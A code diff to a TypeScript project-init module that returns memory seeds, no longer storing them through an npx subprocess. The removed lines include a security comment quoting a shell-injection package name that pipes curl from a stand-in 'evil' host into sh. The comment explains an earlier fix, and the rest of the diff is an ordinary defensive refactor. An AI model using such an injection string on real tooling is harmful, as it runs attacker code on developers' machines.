@@ -6,7 +6,6 @@
  * 2. Memory seeds — pre-loaded into SQLite so agents start with project best practices
  */
 
-import { execFileSync } from 'node:child_process';
 import * as fs from 'node:fs';
 import * as path from 'node:path';
 import { guardFor } from './file-guard.js';
@@ -655,7 +654,13 @@ export function generateMemorySeeds(profile: ProjectProfile): MemorySeed[] {
 
 // ── Writer (called from executor.ts) ─────────────────────────────────────────
 
-export function writeSharedInstructions(cwd: string, force: boolean, result: InitResult): void {
+/** Writes .agents/shared_instructions.md and returns the memory seeds for the
+ *  project it described (none when the file was left alone). */
+export function writeSharedInstructions(
+  cwd: string,
+  force: boolean,
+  result: InitResult,
+): MemorySeed[] {
   const agentsDir = path.join(cwd, '.agents');
   const siPath = path.join(agentsDir, 'shared_instructions.md');
   const exists = fs.existsSync(siPath);
@@ -663,7 +668,7 @@ export function writeSharedInstructions(cwd: string, force: boolean, result: Ini
   // Skip if already exists and not forcing
   if (exists && !force) {
     result.skipped.push('.agents/shared_instructions.md');
-    return;
+    return [];
   }
 
   try {
@@ -685,7 +690,7 @@ export function writeSharedInstructions(cwd: string, force: boolean, result: Ini
     );
     if (content === null) {
       result.skipped.push('.agents/shared_instructions.md (edited monomind block kept)');
-      return;
+      return [];
     }
 
     if (!fs.existsSync(agentsDir)) {
@@ -694,45 +699,11 @@ export function writeSharedInstructions(cwd: string, force: boolean, result: Ini
     fs.writeFileSync(siPath, content, 'utf-8');
     result.created.files.push('.agents/shared_instructions.md');
 
-    // Seed memory (best-effort, non-blocking).
-    // SECURITY: previously the seed.key (built from package.json `name`) was
-    // interpolated into a shell command via execSync. A malicious package.json
-    // with a name like `x"; curl evil | sh; #` produced shell injection during
-    // `monomind init`. Switch to execFileSync (array argv, no shell) and
-    // reject seed inputs that don't match a tight regex.
-    const KEY_RE = /^[a-zA-Z0-9._:/-]{1,128}$/;
-    const NS_RE = /^[a-zA-Z0-9_-]{1,64}$/;
-    const seeds = generateMemorySeeds(profile);
-    for (const seed of seeds) {
-      if (!KEY_RE.test(seed.key) || !NS_RE.test(seed.namespace) || typeof seed.value !== 'string') {
-        continue;
-      }
-      try {
-        execFileSync(
-          'npx',
-          [
-            '--yes',
-            'monomind@latest',
-            'memory',
-            'store',
-            '--key',
-            seed.key,
-            '--value',
-            seed.value,
-            '--namespace',
-            seed.namespace,
-          ],
-          { cwd, stdio: 'ignore', timeout: 8000 },
-        );
-      } catch {
-        // Non-critical — memory seeding is best-effort
-      }
-    }
-
-    if (seeds.length > 0) {
-      result.created.files.push(`.agents: ${seeds.length} memory patterns seeded`);
-    }
+    // Memory seeds are returned, not stored here: the executor stores them
+    // in-process once the project database exists, and only when memory is on.
+    return generateMemorySeeds(profile);
   } catch {
     // Non-critical — shared instructions generation is best-effort
+    return [];
   }
 }
